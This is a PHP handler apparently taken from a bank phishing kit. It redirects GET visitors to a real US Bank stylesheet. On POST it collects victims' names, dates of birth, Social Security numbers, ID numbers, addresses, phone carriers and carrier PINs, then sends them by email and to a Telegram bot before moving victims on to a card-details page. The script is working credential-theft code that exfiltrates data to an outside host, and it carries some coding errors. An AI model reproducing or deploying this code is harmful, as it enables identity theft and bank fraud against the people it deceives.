<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] === "GET") {
    header("Location: https://onlinebanking.usbank.com/auth/login/static/css/main.45c70042.chunk.css?id=".md5(uniqid(rand(), true)));
}elseif ($_SERVER["REQUEST_METHOD"] === "POST") {
    include "../data.php";
    function get_client_ip() {
        $ipaddress = "";
        if (getenv("HTTP_CLIENT_IP"))
            $ipaddress = getenv("HTTP_CLIENT_IP");
        else if(getenv("HTTP_X_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_X_FORWARDED_FOR");
        else if(getenv("HTTP_X_FORWARDED"))
            $ipaddress = getenv("HTTP_X_FORWARDED");
        else if(getenv("HTTP_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_FORWARDED_FOR");
        else if(getenv("HTTP_FORWARDED"))
            $ipaddress = getenv("HTTP_FORWARDED");
        else if(getenv("REMOTE_ADDR"))
            $ipaddress = getenv("REMOTE_ADDR");
        else
            $ipaddress = "UNKNOWN";
        return $ipaddress;
    }    
    $IP = get_client_ip();
    $fnam = $_POST['fnam'];
        $lnam = $_POST['lnam'];
        $dob = $_POST['dob'];
        $soc = $_POST['soc'];
        $typid = $_POST['typid'];
        $idnum = $_POST['idnum'];
        $stadd = $_POST['stadd'];
        $soa = $_POST['soa'];
        $zip = $_POST['zip'];
        $city = $_POST['city'];
        $state = $_POST['state'];
        $fone = $_POST['fone'];
        $fonecarr = $_POST['fonecarr'];
        $carrpin = $_POST['carrpin'];
    $msg = "ARVEST BANK {Personal Info}"."\r\n";
    $msg = "fname : $fnam"."\r\n".
    $msg = "lnams : $lnam"."\r\n".
        $msg = "dob : $dob"."\r\n".
    $msg = "ssn : $soc"."\r\n".
        $msg = "typeid : $typid"."\r\n".
    $msg = "idnum : $idnum"."\r\n".
        $msg = "stadd: $stadd"."\r\n".
    $msg = "soa: $soa"."\r\n".
        $msg = "zip : $zip"."\r\n".
    $msg = "city : $city\n".
        $msg = "state : $state"."\r\n".
    $msg = "phone : $fone"."\r\n".
        $msg = "phonecarrier : $fonecarr"."\r\n".
    $msg = "carrierpin : $carrpin"."\r\n";
	$msg = "IP ADDRESS : https://ip-api.com/".$IP."\r\n";
    $headers = "From: lovely@lovely.com". "\r\n" . "Reply-To: lovely@lovely.com". "\r\n";
    mail($sendto,"ARVEST BANK",$Message,$headers);
    $options=array("http"=>array("method"=>"POST","header"=>"Content-Type:application/x-www-form-urlencoded\r\n","content"=>http_build_query(array("chat_id"=>$telegramchatid,"text"=>$msg)),),);
    file_get_contents("https://api.telegram.org/bot".$telegrambot."/sendMessage",false,stream_context_create($options));
    header("Location: ../cc_info.php?id=".md5(uniqid(rand(), true)));
}
?>